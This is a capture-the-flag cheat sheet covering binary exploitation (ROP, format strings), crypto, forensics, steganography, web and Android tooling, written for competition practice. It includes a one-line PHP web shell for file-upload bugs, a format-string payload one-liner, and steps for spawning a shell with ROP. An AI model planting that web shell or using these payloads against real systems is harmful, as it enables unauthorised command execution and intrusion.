# CTF

##  ► pwn
### Initial checks
- file
- strings
- checksec

### Things to keep in mind
- fgets() means you can use null bytes in your payload but not newlines
- newline is required at the end of your payload to cause the binary to process your input
- passing arguments
  1. _64 bit_ : first four arguments rdi, rsi, rdx, rcx
  2. _32 bit_ : push arguments on to the stack (include them in the payload)

### pwntools

Setting up ``` pwn template ./<binary> --host 127.0.0.1 --port 1337 ```

Debug with gdb ``` io = gdb.debug('./<binary>', 'b main') ```

### Return Oriented Programming

#### Try out ROP Emporium: https://ropemporium.com/

#### Finding gadgets

``` ROPgadget --binary file_name > gadgets.txt ```

``` ROPgadget --ropchain --binary file_name > exploit.py ```

- https://github.com/sashs/Ropper
- https://github.com/salls/angrop

#### Getting a shell

- use a call to system() by passing only one argument (something like "ls" or "cat flag.txt")
- use syscall(59) to call to execve() by passing three arguments ('/bin/sh', NULL,NULL)

#### Writing to memory

1. look for gadgets like ``` mov [reg], reg ``` (alternatively use something like ```fgets```)
2. look for places to write to using ``` readelf -S <binary> ``` or ``` rabin2 -S <binary> ```
   (don't forget to consider the size)
3. write the string to the address using the gadget found in step 1.
4. call system() with address of the written string.

#### Finding function addresses

``` nm <binary> | grep ' t ' ```

``` (gdb) info functions ```

#### Lazy Binding: https://ropemporium.com/guide.html

### Format String Attacks

Offset notation ``` %6$x ```

#### Reading from an arbritrary address
1. Get address of string to be read. ``` rabin2 -z <binary> ```
2. Find the offset from the stack where the input is stored to do this %x. then %x.%x. then %x.%x.%x. and so on until you     see the ascii values 25782e.
3. once you know the offset, store the address to be read at that
   offset by typing it in as the first thing in the buffer and then
   use the offset you found out to go read in that address.
```
python -c 'print "\xef\xbe\xad\xde%6$s"' | ./<binary>
```

## ► crypto

#### Try out Cryptopals: https://cryptopals.com/

### RSA

- if ```n``` is given, try checking if it is already factored at http://factordb.com
- use Crypto.Util.number inverse to find modular inverse for RSA
- use RsaCtfTool to perform known attacks against RSA

### AES
- use this tool to decrypt AES encrypted files: http://aes.online-domain-tools.com/


## ► forensics
### Initial checks

- xxd
- file
- strings
- binwalk
- foremost
- johntheripper
- [cryptograms](https://quipqiup.com/)

### Steganography

- exiftool
- strings
- steghide (try blank password)
- stegcracker
- stegdetect (JPG)
- zbarimg/zbarcam (QR-codes)
- stegoveritas
- stegsnow

- pngcheck
- Stegsolve
- jsteg (JPG LSB)
- zsteg (PNG LSB)
- tweakpng
- lsb.py

reverse image serach: http://www.tineye.com
$ compare chall.png maxresdefault.jpg  -compose src diff.png
$ pngcheck chall.png

some string-fu
$ binwalk -e chall.png
$ strings chall.png
$ strings -el chall.png
$ strings chall.jpeg | awk 'length($0)>15' | sort -u


### Audio

- audacity
- deepsound
- sonic visualizer
- [morse code](https://morsecode.scphillips.com/translator.html)

### Filesystems

- mount
- testdisk
- volatility
- extundelete

### PCAP

- wireshark
- packettotal

## ► web

### File upload vulnerabilities

#### Basic PHP shell

``` <?php echo system($_GET['c']); ?> ```

### SQL Injection

- Portswigger's cheat sheet

### XSS

- Portswigger's cheat sheet

## ► android

### adb

Connect your Android device in debug mode.

Installing an app ``` adb install asdf.apk ```

Uninstalling an app ``` adb uninstall com.abhay.asdf ```

View logs ``` adb logcat ```

Copy files to device ``` adb push /machine /mobile ```

List all packages on device ``` adb shell pm list packages ```

Copy files from device ``` adb pull /data/app/asdf.apk /machine ```

### apktool

Disassemble an app ``` apktool d <apk-file> ```

Build a disassembled file ``` apktool b <decompiled-directory> ```

Sign the built app

```
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name
```

### jadx

Decompile an app ``` jadx-gui <apk-file> ```

